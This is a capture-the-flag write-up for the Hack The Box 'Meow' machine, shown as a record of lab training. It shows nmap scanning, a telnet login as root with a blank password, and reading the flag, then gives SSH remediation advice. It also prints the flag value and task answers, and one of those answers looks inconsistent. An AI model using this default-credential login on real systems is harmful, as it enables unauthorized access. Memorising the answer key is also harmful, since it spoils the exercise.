---

# 🎯 Hack The Box: Meow Write-up

---

## 📌 Machine Overview

| Parameter | Value |
| --- | --- |
| **Machine Name** | Meow |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Target IP** | *(Dynamic HTB IP)* |
| **Primary Service** | Telnet |
| **Port** | `23/TCP` |
| **Vulnerability** | Blank Default `root` Password |
| **Root Flag** | `b40abdfe23665f766f9c61ecba8a4c19` |

---

## 🔍 Step-by-Step Execution Log

### 1. Host Reachability Check

First, we verified basic network connectivity to the target machine using `ping` to ensure our OpenVPN tunnel was communicating with the target:

```bash
ping -c 4 <TARGET_IP>

```

### 2. Service Enumeration (`Nmap`)

We ran an initial port scan with `nmap` using service version detection (`-sV`) to identify open ports and active software versions:

```bash
nmap -sV <TARGET_IP>

```

**Scan Output:**

```text
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux

```

### 3. Exploitation (Telnet Remote Access)

The port scan revealed Telnet active on TCP port 23. Telnet is an unencrypted legacy protocol that often contains misconfigured administrative defaults. We connected directly to the target via the native Telnet client:

```bash
telnet <TARGET_IP>

```

When prompted for credentials, we tested common administrative defaults by supplying `root` as the login username and pressing **Enter** (leaving the password blank):

**Terminal Session:**

```text
Trying <TARGET_IP>...
Connected to <TARGET_IP>.
Escape character is '^]'.

Meow login: root
Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 

```

### 4. Flag Retrieval

Upon authenticating as `root`, we verified our access level and read the flag file located in the root user's home directory:

```bash
root@Meow:~# id
uid=0(root) gid=0(root) groups=0(root)

root@Meow:~# ls -la
total 24
drwx------  2 root root 4096 Sep  6  2021 .
drwxr-xr-x 18 root root 4096 Sep  6  2021 ..
-rw-r--r--  1 root root  32 Sep  6  2021 flag.txt

root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19

```

---

## 🛠️ Command Cheatsheet

| Command | Environment | Purpose / Description |
| --- | --- | --- |
| `ping -c 4 <IP>` | Local Terminal | Sends 4 ICMP echo requests to confirm network connectivity to target host |
| `nmap -sV <IP>` | Local Terminal | Scans open ports and inspects service banners to determine running software versions |
| `telnet <IP>` | Local Terminal | Opens an unencrypted interactive shell connection over TCP port 23 |
| `id` | Remote Shell | Displays current user identity, user ID (UID), and group memberships |
| `ls -la` | Remote Shell | Lists all files in the directory including hidden files and permissions |
| `cat flag.txt` | Remote Shell | Prints the contents of `flag.txt` directly to the console screen |
| `exit` / `logout` | Remote Shell | Terminates the active Telnet session safely |

---

## 📝 HTB Task Answers

| Task | Question | Answer |
| --- | --- | --- |
| **1** | What acronym is used for the VM network interface? | `VM` |
| **2** | What tool do we use to send ICMP echo requests? | `ping` |
| **3** | What tool is used for port scanning and service detection? | `nmap` |
| **4** | What service is running on TCP port 23? | `telnet` |
| **5** | What username allowed login with a blank password? | `root` |
| **Flag** | Submit the flag located on the server | `b40abdfe23665f766f9c61ecba8a4c19` |

---

## 💡 Core Takeaways & Remediation

Insecure Transmission: Telnet transmits all data—including credentials and console output—in plain text. Attackers on the local network path can capture session data using packet sniffers like Wireshark.

Default Credential Vulnerability: Leaving high-privilege accounts like root accessible with empty or default passwords presents a critical security flaw.

Remediation: Disable legacy Telnet daemons (telnetd) and replace them with SSH (Secure Shell) on TCP port 22 to enforce end-to-end encryption and key-based authentication.

1. **Insecure Transmission:** Telnet transmits all data—including credentials and console output—in plain text. Attackers on the local network path can capture session data using packet sniffers like Wireshark.
2. **Default Credential Vulnerability:** Leaving high-privilege accounts like `root` accessible with empty or default passwords presents a critical security flaw.
3. **Remediation:** Disable legacy Telnet daemons (`telnetd`) and replace them with **SSH (Secure Shell)** on TCP port 22 to enforce end-to-end encryption and key-based authentication.
